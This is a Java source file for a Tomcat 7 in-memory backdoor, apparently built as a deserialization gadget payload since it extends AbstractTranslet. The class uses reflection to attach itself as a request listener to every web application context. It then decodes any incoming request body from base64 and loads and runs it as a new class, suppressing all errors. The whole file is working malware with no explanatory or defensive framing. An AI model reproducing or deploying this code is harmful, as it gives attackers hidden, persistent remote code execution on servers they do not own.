package ccdr4gon;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.io.BufferedReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

//Tomcat7Init
public class T7 extends AbstractTranslet implements ServletRequestListener {
    public Object G(Object o, String s) throws Exception {
        Field f = o.getClass().getDeclaredField(s);
        f.setAccessible(true);
        return f.get(o);
    }
    public void transform(DOM a, SerializationHandler[] b){}
    public void transform(DOM a, DTMAxisIterator b, SerializationHandler c){}
    public void requestDestroyed(ServletRequestEvent s) {}

        public T7() {
        super();
        super.namesArray= new String[]{"1"};
        try {
            Object o=new Object();
            Thread[] g = (Thread[]) G(Thread.currentThread().getThreadGroup(), "threads");
            for (int i = 0; i < g.length; i++) {
                Thread t = g[i];
                if (t!=null&&t.getName().contains("Backg")) {
                    o = G(G(t, "target"), "this$0");
                }
            }
            Field f = Class.forName("org.apache.catalina.core.ContainerBase").getDeclaredField("children");
            f.setAccessible(true);
            HashMap<String,Object> p = (HashMap) f.get(o);
            for (Map.Entry l : p.entrySet()) {
                HashMap<String,Object> k = (HashMap) f.get(l.getValue());
                for (Map.Entry j : k.entrySet()){
                    ((StandardContext)j.getValue()).addApplicationEventListener(this);
                }
            }
        } catch (Exception i) {}
    }
    public void requestInitialized(ServletRequestEvent s) {
        try {
            StringBuilder b = new StringBuilder("");
            BufferedReader r = ((Request) G(s.getServletRequest(), "request")).getReader();
            String g;
            while ((g = r.readLine()) != null) {
                b.append(g);
            }
            byte[] p = Base64.getDecoder().decode(b.toString());
            Method m = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            m.setAccessible(true);
            Class c = (Class) m.invoke(Thread.currentThread().getContextClassLoader(), p, 0, p.length);
            c.newInstance();
        }catch (Exception i){}
    }
}
